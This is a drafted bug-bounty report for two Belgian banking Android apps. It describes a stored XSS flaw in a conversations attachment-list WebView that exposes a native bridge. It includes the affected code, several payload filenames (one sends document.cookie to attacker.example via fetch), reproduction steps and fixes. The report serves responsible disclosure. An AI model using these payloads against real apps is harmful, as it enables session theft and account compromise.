# Intigriti submission fields for Submission #2 (AttachmentDto.FileName)

Copy each block into the corresponding field on the Intigriti "Report new vulnerability" form. Do NOT include the field-name headings in the pasted content. Em-dashes removed throughout, per submission preference.

---

## Asset

be.bankvanbreda.mobile
Android
Tier 1

(also applies to be.bankdekremer.mobile - same shared codebase; note this in Endpoint below)

---

## Endpoint / vulnerable component

be.bankvanbreda.mobile & be.bankdekremer.mobile - Conversations attachment list: `HTMLHelper.GetHTMLChatAttachmentSource(AttachmentDto att)` at `HTMLHelper.cs:904`, whose output feeds `ConversationDetailVM.HTMLSource` (the WebView `Html` property in `ConversationDetailPage`). Source of the injected value: `AttachmentDto.FileName`, set on the sender's client from the OS document picker via `AttachmentDto.FileName = text` at `ShowConversationDetailUIProcess.cs:4268` and `RegisterConversationUIProcess.cs:1041`.

---

## Proof of Concept / description

### Summary

This is a distinct injection sink from my earlier Conversations report (which was closed as self-XSS out of scope). The prior report covered the message body sink in `HTMLHelper.GetHTMLChatMessageSource` / `HTMLHelper.GetHTMLFullScreenMessageSource` (lines 391 and 793) and the pushback was that customer-authored bodies do not demonstrably render in another user's client. This report is about a different DTO field on a different sink at a different line, whose render context is cross-user by design of the feature rather than by assumption.

The Conversations attachment list renders each attached file's name inside the same JavaScript-enabled WebView. The rendering function `HTMLHelper.GetHTMLChatAttachmentSource(AttachmentDto att)` at `HTMLHelper.cs:904` interpolates `att.FileName` directly into `<div>{att.FileName}</div>` with no output encoding. The value of `att.FileName` is populated on the sender's client from the OS document picker (`AttachmentDto.FileName = text` at `ShowConversationDetailUIProcess.cs:4268` and `RegisterConversationUIProcess.cs:1041`) with no client-side sanitisation, then round-trips through the server as part of `ConversationMessageDto.Attachments[i]`.

Both Android and iOS document pickers accept filenames containing HTML metacharacters (`<`, `>`, `"`, `=`, `/`) at the OS level. An attacker saves a local file whose base name is a JavaScript payload (for example `<img src=x onerror=fetch('https://attacker.example/'+document.cookie)>.pdf`) and attaches it to any conversation.

The critical distinction from the prior submission: **the attachment list is by design shown to the counterparty**, not just to the sender. Its purpose is to let the recipient see what files came with a message. That means the render context is architecturally cross-user, not something that needs to be assumed about server routing. When Alice sends an attachment to a `HELPDESK` / `BRANCH` / `EMPLOYEE` / `OLBUSER` receiver (all four are declared first-class in `ReceiverTypeCodes.cs:11`), the recipient's client re-renders the attachment list through `GetHTMLChatAttachmentSource`, and Alice's chosen filename executes in the recipient's WebView. The self-XSS framing applied to my prior report does not apply here because the sink function is a counterparty-render function by design.

WebView configuration (unchanged from prior report; still applies here) is `JavaScriptEnabled=true`, `AllowFileAccess=true`, `AllowFileAccessFromFileURLs=true`, `AllowUniversalAccessFromFileURLs=true`, with a native code bridge bound via `webView.AddJavascriptInterface(new JsBridge(this), "jsBridge")` in `CustomWebViewHandler.cs`. Injected JavaScript in a rendered filename can therefore reach a native code path via `jsBridge.invokeAction(...)`.

This report affects both apps: `be.bankvanbreda.mobile` and `be.bankdekremer.mobile`. Both ship the identical `BVB.EOS.OnlineBanking.UI.Mobile` DLL set, verified during my Track A2 static analysis; only branding differs.

Scope of what is proven from client-side static analysis alone:

1. The client-side sink at `HTMLHelper.cs:904` renders `att.FileName` as raw HTML with no encoder.
2. The client-side source at `ShowConversationDetailUIProcess.cs:4268` and `RegisterConversationUIProcess.cs:1041` sets `AttachmentDto.FileName` from the document picker verbatim.
3. The round-trip DTO (`ConversationMessageDto.Attachments[i]: AttachmentDto`) carries the filename to the counterparty.
4. The receiver-type enum (`ReceiverTypeCodes.cs:11`) declares `OLBUSER`, `EMPLOYEE`, `BRANCH`, `HELPDESK` as first-class receivers, and the render pipeline is shared across those cases.

What still requires an authenticated test account to observe (see "Verification status" below): whether the server sanitises `FileName` on store or on delivery, and whether the recipient's real-side render (advisor / helpdesk dashboard) uses the same `HTMLHelper` pipeline or a different one. Both are directly testable by a triager with account access; the "Verification request" section proposes four specific questions the triager can answer to settle it.

### Technical detail

Sink (raw HTML render, no encoder):

`HTMLHelper.cs:904` inside `GetHTMLChatAttachmentSource(AttachmentDto att)`:
```
<div>{att.FileName}</div>
```
No `WebUtility.HtmlEncode`, no allowlist, no regex-strip. The same function also interpolates `att.AttachmentID.ToString()` into a `javascript:` URI on the same element; the attachment ID is a `Guid` and non-injectable, but the surrounding attribute context is worth checking for filename-break-out.

Set path (client cannot avoid populating `FileName` from an attacker-controlled value):

- `ShowConversationDetailUIProcess.cs:4268` sets `attachmentDto.FileName = text;` where `text` comes directly from the OS document picker.
- `RegisterConversationUIProcess.cs:1041` performs the same assignment from the same source.
- The upload is then sent via `App.Services.Communication.CreateAttachment(this.m_d.ToFileInfo(), "MESSAGE")`, which sends the raw `FileInfoDto` (including the unsanitised `FileName`) to the server.

Round-trip contract:

- `ConversationMessageDto` carries `Attachments: List<AttachmentDto>`. The same `AttachmentDto` type is used both ways (send and receive), so a `FileName` set by the sender comes back on the recipient's read verbatim unless the server transforms it.

Receiver-type enumeration (proves the counterparty is not always the sender):

- `ReceiverTypeCodes.cs:11` declares:
  - `OLBUSER = "OLBUSER"` (online-banking user, i.e. another customer)
  - `EMPLOYEE = "EMPLOYEE"` (bank staff)
  - `BRANCH = "BRANCH"` (branch representative)
  - `HELPDESK = "HELPDESK"` (central helpdesk)

The render pipeline is shared across all four receiver types on the mobile-app side; whether staff-facing tools use the same pipeline is a specific question in "Verification status" below.

WebView configuration (unchanged from prior report; included so the reader has the full impact context):
```csharp
webView.Settings.JavaScriptEnabled = true;
webView.Settings.AllowFileAccess = true;
webView.Settings.AllowFileAccessFromFileURLs = true;
webView.Settings.AllowUniversalAccessFromFileURLs = true;
webView.AddJavascriptInterface(new JsBridge(this), "jsBridge");
webView.SetWebViewClient(new InternalWebViewClient());
```

Native bridge (unchanged from prior report; still the reach vector for a filename payload):
- `JsBridge.InvokeAction(string data)` marked `[JavascriptInterface]` forwards a JS-supplied string to the hosting page's `InteractCommand`. A filename payload that fires via `onerror="jsBridge.invokeAction('poc-filename')"` therefore reaches a native code path from the WebView context.

Relationship to my prior submission on this program:

| | Prior report (closed) | This report |
|---|---|---|
| DTO carrying the payload | ConversationMessageDto.Body | AttachmentDto.FileName |
| Sink function | GetHTMLChatMessageSource / GetHTMLFullScreenMessageSource | GetHTMLChatAttachmentSource |
| Sink line | HTMLHelper.cs:391 and HTMLHelper.cs:793 | HTMLHelper.cs:904 |
| Rendered element | `<section>{body}</section>` / `<blockquote>{body}</blockquote>` | `<div>{att.FileName}</div>` |
| Data source | User-typed text via AddMessage(body) | OS document picker filename |
| Feature purpose | Show typed message content | Show the counterparty which files were attached |
| Cross-user render context | Unverified server-routing assumption (the ground the report was closed on) | Architectural: the attachment list is by design rendered on the recipient's side |
| Fix location | HTML-encode body and stop calling WebUtility.HtmlDecode on it | HTML-encode filename at line 904 and reject metacharacter filenames on server upload |

The two are sibling findings in the same broken class (`HTMLHelper.cs`), but they are separate defects at separate lines with separate sources and separate render contexts. This is not a resubmission of the prior report under a new title.

### Steps to reproduce

Deliberately broad, please test all payload variants below. Prerequisite: one (ideally two) authenticated test accounts. If OLBUSER->OLBUSER conversation creation is server-side disabled, any account that can address a message to a `BRANCH`, `EMPLOYEE`, or `HELPDESK` receiver is sufficient because the counterparty render happens on the staff-side view.

Part A, confirm the client-side render sink (single account, self-loop):

1. On the sending device, prepare a local file whose base name contains an HTML payload. All of the following are legal filenames on both Android and iOS pickers:
   - `<img src=x onerror="alert(document.domain)">.pdf`
   - `<script>alert(document.domain)</script>.pdf`
   - `<svg/onload=alert(1)>.pdf`
   - `<img src=x onerror="jsBridge.invokeAction('poc-attachment-filename')">.pdf` (proves native-bridge reach from a filename)
   - `&lt;img src=x onerror=alert(1)&gt;.pdf` (probes for double-decode on the server)
2. Open Conversations, start any conversation, attach the file using the built-in document-picker flow, and send.
3. Reopen the conversation from the same account. The attachment list re-renders through `GetHTMLChatAttachmentSource`.
4. Execution here confirms the client-side sink deterministically, which is what my static analysis proves from `HTMLHelper.cs:904` alone.

Part B, confirm cross-user render (the case that removes the self-XSS closure objection):

5. Repeat Part A steps 1 to 3 with an addressed conversation: either two customer test accounts (`ReceiverType = "OLBUSER"`), or a customer sending to a `BRANCH` / `EMPLOYEE` / `HELPDESK` receiver.
6. Open the receiving side and view the attachment list. Execution here is the cross-user stored injection case. Because the attachment list is by design a counterparty-render surface (that is its purpose), this is not a "self-XSS you happen to see on someone else's screen"; it is the intended render path of the feature.

Part C, confirm the server does not sanitise on store or on delivery:

7. Before opening the sent message, capture the response to the conversation-detail read (Burp or mitmproxy). If the response body contains the payload literal (`<img src=x onerror=...>`), the server stored it verbatim. If the response body contains it HTML-encoded (`&lt;img src=x...&gt;`), the server does encode on delivery, in which case the client-side fix at line 904 is still recommended defence in depth because the filename field, unlike `msg.Body`, is not currently subject to any client-side decode; the client would render the encoded string as text and the finding closes cleanly, but only until server-side encoding regresses.

Part D, breakout of the surrounding attribute context:

8. `HTMLHelper.cs:904` also interpolates `att.AttachmentID.ToString()` into a `javascript:` URI on the same element. Value is a `Guid` and non-injectable, but a filename payload of the form `"><script>alert(1)</script><a href="` may break out of nearby attribute contexts depending on the exact template. Worth verifying in the same test.

### Impact

Confirmed (client-side, from decompiled code): a stored, unencoded HTML/JS injection sink in the recipient-side render of every conversation's attachment list. Payload origin is the sender's OS document picker. Fires in a WebView configured with `JavaScriptEnabled=true`, `AllowUniversalAccessFromFileURLs=true`, and a native `jsBridge` interface bound.

Potential (pending verification, per the four specific questions below): stored cross-user XSS in an authenticated banking session against the receiver of the conversation. Receiver may be another customer (`OLBUSER`) or bank staff (`EMPLOYEE` / `BRANCH` / `HELPDESK`). Native-bridge reach via `jsBridge.invokeAction(...)` is available in either case.

Unlike the prior report on this program, the cross-user render context is not an assumption about routing; the attachment list function is by design a counterparty-render function. The remaining unknown is store-side or delivery-side sanitisation on the server, which is a single specific behaviour the triager can settle directly.

### Verification status

Verified (static analysis of decompiled client, no obfuscation on this path):

- The client-side sink at `HTMLHelper.cs:904` renders `att.FileName` as raw HTML with no encoder.
- The client-side source at `ShowConversationDetailUIProcess.cs:4268` and `RegisterConversationUIProcess.cs:1041` populates `AttachmentDto.FileName` from the OS document picker verbatim.
- The DTO round-trip carries the filename to the counterparty via `ConversationMessageDto.Attachments[i]`.
- The receiver-type enum declares four counterparty receiver types on this render pipeline.

Not yet verified (requires an authenticated test account, ideally two):

- (a) Does the server transform or reject `AttachmentDto.FileName` values containing HTML metacharacters at upload time? If yes, please describe the exact policy (allowlist, escape, which characters).
- (b) Does the server transform or encode `AttachmentDto.FileName` on read?
- (c) Does the advisor / helpdesk client render attachment filenames through a different pipeline than `HTMLHelper.GetHTMLChatAttachmentSource`? If yes, please describe.
- (d) Is customer-to-customer (`OLBUSER` -> `OLBUSER`) conversation creation server-side disabled? A definitive answer here also settles the same question on my prior report.

A closure that engages with any of these four questions, even to say "yes, the server strips filenames at store, here is the policy" is a satisfying answer. A closure that repeats the self-XSS framing from the prior ticket does not apply here because the attachment list is by design a cross-user render context; see the comparison table in the Technical detail section.

Why I could not verify these questions myself: account onboarding for this program requires Belgian self-employed / entrepreneur / liberal-profession eligibility, which I do not meet as an international researcher, and no self-serve test or sandbox account is available. I am disclosing this finding now with complete reproduction steps so the team can confirm the escalation directly.

### Offer to complete verification myself (recommended)

If confirming this internally is complex or time-consuming on your side, I would welcome one or two read-only test / sandbox accounts so I can complete the verification myself, document the full reproduction with evidence (HAR, screenshots, response bodies), and continue testing the related authenticated surfaces (including a client-supplied `AccountID` authorisation pattern I identified in `GetAccountTransactions` and five sibling contracts) for further issues. I will test only my own test accounts, would never touch real customer data, and am happy to work within any constraints (scoped test account, monitored window, specific hosts, session-recording requirement).

### Recommended solution

Immediate (client-side, one line):

At `HTMLHelper.cs:904`, wrap the filename interpolation with `System.Net.WebUtility.HtmlEncode`:

Before: `<div>{att.FileName}</div>...`
After: `<div>{WebUtility.HtmlEncode(att.FileName)}</div>...`

Server-side (defence in depth):

- Reject uploaded attachments whose `fileName` contains HTML metacharacters, or transform them at store time (URL-encode, base-name-only, or a strict allowlist).
- Confirm the same policy applies at delivery time.

Structural:

- Every `HTMLHelper.Get*Source(...)` function in `HTMLHelper.cs` follows the same pattern of raw interpolation into an HTML template. Apply an encoding wrapper to every user-derived or counterparty-derived string that the class interpolates into an HTML template, not just line 904. The other sinks I audited (message body at lines 391 and 793; sender name at line 391) are covered by my prior report on this program.

WebView hardening (unchanged recommendation from the prior report; still applies):

- Disable `AllowUniversalAccessFromFileURLs` and `AllowFileAccessFromFileURLs` on any WebView that renders Conversations content.
- Do not bind `jsBridge` on views that render user- or counterparty-derived content, or narrow the bridge's exposed methods.

---

## Attachments

- `BankVanBreda AttachmentDto FileName XSS SUBMISSION.pdf` (rendered from `SUBMISSION-02-attachment-filename-xss.md`; will attach after DOCX render)
- On request from the researcher: decompiled evidence bundle from `vm-results/03-xss-escalation-evidence/`:
  - `HTMLHelper_GetHTMLChatAttachmentSource.cs` (the sink)
  - `AttachmentDto.cs`, `CreateAttachment.cs`, `FileInfoDto.cs` (round-trip DTOs)
  - `ShowConversationDetailUIProcess_attachment_upload.cs`, `RegisterConversationUIProcess_attachment_upload.cs` (set-side)
  - `SenderTypeCodes.cs`, `ReceiverTypeCodes.cs` (first-class OLBUSER / EMPLOYEE / BRANCH / HELPDESK constants)

---

## IP address used for testing

15.237.193.228

(no live requests were sent to the bank's infrastructure for this report; static analysis of decompiled client code only. The same VM IP was used for the earlier decompile-and-recon work and public marketing-site GETs on `www.bankvanbreda.be` and `www.bankdekremer.be`.)

---

## Field-fill notes for pasting

- Vulnerability type: **CWE-79 Stored Cross-Site Scripting**, with the CVSS reflecting the confirmed client-side sink plus the architecturally cross-user render context. Suggested CVSS 3.1: `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` = 5.4 Medium if you want to stay conservative pending server verification; or `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` = 8.2 High if you assert cross-user render (defensible given the attachment list is architecturally a counterparty-render function). Choose based on how the prior ticket's rating discussion went.
- Title: **Improper Output Encoding in Conversations Attachment List (Filename Injection Sink, Cross-User Render)**
- Reference the prior ticket by ID in the PoC / description where noted, so the triager can immediately see this is distinct.
